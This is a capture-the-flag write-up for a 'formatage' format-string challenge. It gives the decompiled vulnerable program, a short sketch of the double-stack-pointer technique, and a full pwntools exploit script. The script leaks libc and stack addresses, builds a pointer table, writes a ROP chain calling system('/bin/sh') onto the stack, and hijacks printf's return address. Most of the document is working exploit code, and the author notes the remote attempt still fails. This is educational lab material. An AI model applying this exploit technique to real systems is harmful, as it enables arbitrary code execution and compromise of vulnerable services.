## Level: Hard

### Challenge


#### TL;DR

- Abuse pointers in form of `**` which points to stack addresses to overwrite saved rip of printf to return to main

- Set up read-what-where primitive by creating a pointer table and write ROP onto the stack via pointer table because our input is stored in heap...

- and overwrite printf ret and return to our ROP chain on the stack
  
- for profit...

```c
void main(void)
{
  long in_FS_OFFSET;
  char *local_20;
  size_t local_18;
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  local_20 = (char *)0x0;
  local_18 = 0;
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  getline(&local_20,&local_18,stdin);
  printf(local_20);
  if (local_20 != (char *)0x0) {
    free(local_20);
  }
  local_20 = (char *)0x0;
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
> it takes our input and echoes it back

> classic fmt but with only one shot...


```
[*] '/home/4rsp/Downloads/FSCS/formatage_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```
> as expected, and thats how i like my binary

I followed voydstack's [writeup](https://hackropole.fr/en/writeups/fcsc2022-pwn-formatage/202b3b8a-fa8d-4a37-b342-967db364d9ee/) but still couldn't solve on remote...

...yikes.

his/her write-up is pretty good and im not going to waste my time inventing the wheel again...

but i will just dump this for future use (and you 😉):

![ptable](https://github.com/user-attachments/assets/08319ac5-d387-4afb-a54f-007cb17aadea)
> general concept of abusing double stack pointers and creating ptable -> ROP on the stack...
 
- make the double pointer trick work by `"%c" * (pointer_offset - 2 ) + f"%{target - (pointer_offset - 2)}c" + "%hn"` 
> > not sure why, could it be related to printf cache??

> > also no need to do this everytime... do it once and use `$` to overwrite again 

> > more about [double pointers](https://j00ru.vexillium.org/slides/2015/insomnihack.pdf#page=98) and remote brute force examples [1](https://github.com/leesh3288/CTF/blob/master/2020/TWCTF_2020/blindshot/solver.py), [2](https://github.com/nobodyisnobody/write-ups/blob/main/idekCTF.2022/pwn/relativity/working.exploit.py)

and the full code (don't wanna call exploit... no flag 😞):

```python3
#!/usr/bin/env python3

from pwn import *

'''
p = gdb.debug("./formatage_patched", gdbscript="""
    b *0x555555555278
    c
""")
'''

p = process("./formatage_patched")

# p = remote("localhost", 4000)

p_offset = 15

# printf's saved_rip
target = int(0xe358)

ret = 216
payload = "%c" * (p_offset - 2)
payload += f"%{target - (p_offset - 2)}c" + "%hn"
# return to main by overwriting saved rip of printf...
payload += f"%{ret}c%47$hhn"

# with leaks :)
payload += "____"
payload += "%11$llx %13$llx %15$llx"
 
p.sendline(payload)

p.recvuntil(b"____")
leak = p.recvline().strip()
print(leak)

libc_leak = leak[:12]
main_leak = leak[13:][:12]
stack_leak = leak[26:][:12]

main = int(main_leak, 16)
stack = int(stack_leak, 16)
libc_leak = int(libc_leak, 16)
                                                                                                                                                                                             
libc_base = libc_leak - 188368
print(f"LIBC base at: {hex(libc_base)}")
print(f"main at: {hex(main)}")
print(f"stack at: {hex(stack)}")

# helper stack addr to create pointer table func
def ptable_helper_addr(dp_offset, target, ret):
    payload = "%c" * (dp_offset - 2)
    payload += f"%{target - (dp_offset - 2)}c" + "%hn"
    # overwrite printf's ret again,
    payload += f"%{ret}c%47$hhn"
    p.sendline(payload.encode('utf-8'))
    print("creating helper..")

# create pointer table func
def ptable(offset, target, ret):
    payload = f"%{target}c%{offset}" + "$hn"
    # overwrite printf's ret again,
    payload += f"%{ret}c%47$hhn"
    p.sendline(payload.encode('utf-8'))


# reads upto 4 bytes into crafted pointers func
def write4(where, what, ret, amount):
    payload = f"%{what}c%{where}" + f"${amount}"
    # printf ret
    payload += f"%{ret}c%47$hhn"
    p.sendline(payload)

system = libc_base + 346848
pop_rdi = libc_base + 0x000000000002e6c5 
binsh = libc_base + 1948858
ret = libc_base + 0x000000000002d9b9

print(f"system at: {hex(system)}")
print(f"pop_rdi at: {hex(pop_rdi)}")
print(f"binsh at: {hex(binsh)}")

# create pointer table (8x4 bytes)
# first 8 bytes

where = int(0xe398)
pt_where = int(0xe4e0)

# printf saved rip
pt_rsp = 80
rsp = 160-8

ptable_helper_addr(33, pt_where, pt_rsp)
ptable(49, where, rsp)

ptable_helper_addr(33, pt_where+8, pt_rsp-8)
ptable(49, where+2, rsp-2)

ptable_helper_addr(33, pt_where+16, pt_rsp-16)
ptable(49, where+4, rsp-4)

# second 8 bytes
ptable_helper_addr(33, pt_where+24, pt_rsp-24)
ptable(49, where+8, rsp-8)

ptable_helper_addr(33, pt_where+32, pt_rsp-32)
ptable(49, where+10, rsp-10)

ptable_helper_addr(33, pt_where+40, pt_rsp-40)
ptable(49, where+12, rsp-12)

# third 8 bytes
ptable_helper_addr(33, pt_where+48, pt_rsp-48)
ptable(49, where+16, rsp-16)

ptable_helper_addr(33, pt_where+56, pt_rsp-56)
ptable(49, where+18, rsp-18)

ptable_helper_addr(33, pt_where+64, pt_rsp-64)
ptable(49, where+20, rsp-20)

# fourth 8 bytes
ptable_helper_addr(33, pt_where+72, pt_rsp-72)
ptable(49, where+24, rsp-24)

ptable_helper_addr(33, pt_where+80, pt_rsp+176)
ptable(49, where+26, rsp-26)

ptable_helper_addr(33, pt_where+88, pt_rsp+168)
ptable(49, where+28, rsp-28)


# write pop_rdi -> binsh -> ret -> system (on the stack)
write4(54, int(hex(pop_rdi)[10:], 16), 107, "hn")
write4(55, int(hex(pop_rdi)[6:][:4], 16), 110, "hn")
write4(56, int(hex(pop_rdi)[2:][:4], 16), 49, "n")

write4(57, int(hex(binsh)[10:], 16), 118, "hn")
write4(58, int(hex(binsh)[6:][:4], 16), 83, "hn")
write4(59, int(hex(binsh)[2:][:4], 16), 49, "n")

write4(60, int(hex(ret)[10:], 16), 119, "hn")
write4(61, int(hex(ret)[6:][:4], 16), 110, "hn")
write4(62, int(hex(ret)[2:][:4], 16), 49, "n")

write4(63, int(hex(system)[10:], 16), 80, "hn")
write4(64, int(hex(system)[6:][:4], 16), 107, "hn")
write4(65, int(hex(system)[2:][:4], 16), 49, "n")

# overwrite printf ret with "add, rsp+offset;ret" to point at ROP chain
# create ptable for printf ret

printf_ret = stack - 336
print(f"printf ret at: {hex(printf_ret)}")

ptable_helper_addr(33, pt_where, 80)
ptable(49, int(hex(printf_ret)[10:], 16), 216)

ptable_helper_addr(33, pt_where+8, 72)
ptable(49, int(hex(printf_ret)[10:], 16)+2, 214)

ptable_helper_addr(33, pt_where+16, 64)
ptable(49, int(hex(printf_ret)[10:], 16)+4, 212)

ptable_helper_addr(33, pt_where+24, 56)
ptable(49, int(hex(printf_ret)[10:], 16)+5, 211)

# add rsp, 0x38
add_rsp = libc_base + 0x000000000005e2b5 
print(f"add_rsp at: {hex(add_rsp)}")

# now overwrite printf ret at once
add_rsp1 = int(hex(add_rsp)[10:], 16)
add_rsp2 = int(hex(add_rsp)[6:][:4], 16)
add_rsp3 = int(hex(add_rsp)[4:][:2], 16)
add_rsp4 = int(hex(add_rsp)[2:][:2], 16)

offset = 54
payload = f"%{add_rsp4}c%{offset+3}" + "$hhn"
payload += f"%{(add_rsp3 - add_rsp4)}c%{offset+2}" + "$hhn"
payload += f"%{(add_rsp1 - add_rsp3)}c%{offset}" + "$hn"
payload += f"%{(add_rsp2 - add_rsp1)}c%{offset+1}" + "$hn"

p.sendline(payload)


p.interactive()
```

> should be 12 bits bruteforce... check it again, doesn't return to main after first payload 

> able to return to main now, but looks like there's another problem

> burnt out... will solve similar challenge.

> side note: don't ever fucking take a break when solving a problem 😠




